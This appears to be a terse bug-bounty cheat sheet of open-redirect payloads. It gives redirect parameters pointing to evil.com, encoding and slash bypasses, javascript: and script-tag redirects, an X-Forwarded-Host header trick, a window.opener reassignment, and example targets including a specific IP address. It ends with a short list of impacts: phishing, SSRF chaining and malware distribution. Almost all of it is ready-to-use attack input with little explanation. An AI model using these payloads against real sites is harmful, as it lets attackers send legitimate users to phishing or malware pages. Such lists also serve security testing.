# open redirect


1 - payload: {evil.com} 


===>>> example: site.com/.../redirect_uri=evil.com/...

===>>> example: site.com/.../next_url=evil.com/...

===>>> example: site.com/.../current_url=evil.com/...

===>>> example: ===>>> example: site.com/.../returnurl=http://evil.com   <<<===

2 - payload: {///%5Cevil.com/} 


===>>> example: site.com///%5Cevil.com/ 
===>>> http://victim.com/page?redirect=http://evil.com
http://victim.com/page?url=https://evil.com
http://victim.com/page?next=//evil.com
http://victim.com/page?return=%2F%2Fevil.com
http://victim.com/page?redirect=https%3A%2F%2Fevil.com%2F
http://victim.com/page?redirect=///evil.com
http://victim.com/page?redirect=\/\evil.com
http://victim.com/page?redirect=javascript:window.location='http://evil.com'
http://victim.com/page?redirect=%3Cscript%3Ewindow.location='http://evil.com'%3C%2Fscript%3E
http://victim.com/page?redirect=//evil.com%00
http://victim.com/page?redirect=https://evil.com%2F%5C
===>>>
3 - payload:  </script>window.location"http://evil.com"</script>


===>>> example: search box : injection

4 - payload: {bing.com}


===>>> example: ===>>> url ===>>> X-forwarded-host: bing.com

5 - payload: {%E3%80%82}


===>>> example: https://20.44.36.49//google%E3%80%82com , https://20.44.36.49//bing%E3%80%82com , https://20.44.36.49//yahoo%E3%80%82com

6 - payload: { opener.location="https://evil.com"}

===>>> example: email ===>>> inspect ===>>> console: opener.location="https://evil.com"

7 - payload: {forget password}

===>>> example: https://20.44.36.49/.../google.com


==================================================================


## impact:
- an attacker can do phishing with legitimate users
-  they can also chain this with SSRF
-  reputation loss, money loss
-  malware distribution
  
